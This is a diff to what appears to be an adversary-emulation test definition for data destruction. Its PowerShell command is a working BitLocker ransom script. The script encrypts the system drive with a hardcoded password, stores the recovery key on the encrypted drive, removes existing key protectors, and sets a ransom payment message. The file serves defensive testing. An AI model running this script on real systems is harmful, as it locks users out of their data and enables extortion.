@@ -3,41 +3,25 @@ attack_technique: T1561
 display_name: 'Data Destruction'
 
 atomic_tests:
-
 - name: Restrict Drive Access Using Bitlocker
 
   description: |
-
-    Encrypts the primary hard disk using Bitlocker. A successful reboot will keep the user from logging into the system as the password is saved on the local drive.
-
-  
+    Encrypts the primary hard disk using Bitlocker. A successful reboot will keep the user from logging into the system as the password is saved on the local drive. This can be changed in the script.
 
     Sources:
-
     https://github.com/rschwass/scripts/blob/master/bitlocker_ransom.ps1(This code)
 
-  
-
     References (for recreating this from commands and help modules):
-
     https://docs.microsoft.com/en-us/powershell/module/bitlocker/add-bitlockerkeyprotector?view=win10-ps
-
     https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-use-bitlocker-drive-encryption-tools-to-manage-bitlocker
-
     https://social.technet.microsoft.com/Forums/windowsserver/en-US/777adeea-3e4b-447e-b5d0-e6636131bcec/what-managebde-command-to-let-encrypt-windows-drive-whithout-having-tpm-chip?forum=w7itprosecurity
 
   supported_platforms:
-
   - windows
 
   executor:
 
     command: "#Set Execution Policy to allow script to run\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n\n#Bitlocker for Ransom\n\n\n#Is Bitlocker already enabled on the system drive\n$Check = (get-bitlockervolume -mountpoint $ENV:SystemDrive)\n$Status = $Check.ProtectionStatus\nif($Status -eq 'Off'){echo 'Bitlocker NOT Enabled on System Drive'}\nif($Status -eq 'On'){echo 'Bitlocker IS Enabled on System Drive'}\n\n#Set registry first\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseAdvancedStartup /t REG_DWORD /d 1 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPM /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKey /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n\n#Change the recovery message to meet your needs. In my example I put a fake website where the victim can come and pay for their password\n\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v RecoveryKeyMessage /t REG_SZ /d 'please Visit my hacker site https://yourscrewed.hahaha to give me money' /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /V RecoveryKeyMessageSource /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMPIN /t REG_DWORD /d 2 /f\n\n#Use a Strong Password Here!\n$PlainPassword = \"P@ssw0rd\"\n$SecurePassword = $PlainPassword | ConvertTo-SecureString -AsPlainText -Force \n\n\n\nif($Status -eq 'Off'){\n\n#Enable Bitlocker, Encrypt the used space on the C: drive\nenable-bitlocker -EncryptionMethod Aes256 -password $securepassword -mountpoint $ENV:SystemDrive  -PasswordProtector -skiphardwaretest -UsedSpaceOnly\n\n\n#To use the Custom Recovery Screen, there must be a recovery key created. I dont want to use the recovery key, so I put it on the encrypted C: drive so it is inaccessable.\nadd-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\\\n\n#Uncomment to restart the Computer ASAP so that the damage is done before the user can undo it. I dont do this by default\n#restart-computer\n\n}\n\n#If Bitlocker is already enabled on the systemd drive. The following will execute, removing all passwords and recovery keys. Then adding my own passwords and keys just like before.\nif ($Status -eq 'On'){\n#Strip all Passwords and Recovery keys (Not yet Tested with TPM)\n$IDS = $check.KeyProtector.KeyProtectorID\nforeach($ID in $IDS){\nRemove-BitlockerKeyProtector -Mountpoint $ENV:SystemDrive -KeyProtectorID $ID\n}\nadd-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -PasswordProtector -Password $securepassword\nadd-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\\\nResume-Bitlocker -MountPoint $ENV:SystemDrive\n}"
-
     cleanup_command: manage-bde -off $ENV:SystemDrive
-
     name: powershell
-
-    elevation_required: true
-
-  
+    elevation_required: true  
